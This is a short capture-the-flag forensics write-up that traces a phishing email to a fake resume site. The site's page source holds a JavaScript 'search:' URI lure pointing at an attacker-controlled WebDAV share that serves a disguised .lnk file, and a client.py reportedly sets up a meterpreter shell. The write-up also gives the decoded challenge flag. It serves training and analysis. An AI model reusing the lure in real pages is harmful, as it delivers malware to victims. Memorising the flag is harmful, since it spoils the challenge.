# A new Hire

The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

-----

We are given an `email.eml` with the body relating to a job application. Within the email, there is a link to "review a resume":

```
You can review his resume here:
`storage.microsoftcloudservices.com:[PORT]/index.php`
```

Setting this domain to the given IP within `/etc/hosts` and navigating to the website shows a blurred resume:

![[Pasted image 20250322154308.png]]

Looking at the sourcecode, we see references to an additional path - `3fe1690d955e8fd2a0b282501570e1f4/resumes`

```js
function getResume() {
	window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
}
```

Looking through the directory structure:

```
3fe1690d955e8fd2a0b282501570e1f4
../Python312/
..../[Python3.12 source files and binaries]
../configs/
..../client.py
../resumes/
..../Resume.pdf.lnk
../resumesS/
..../resume_official.pdf
```

Within `configs/client.py`, we see a meterpreter shell is being set up. The `key` variable contains the flag as Base64:

```python
key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")
```

```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
```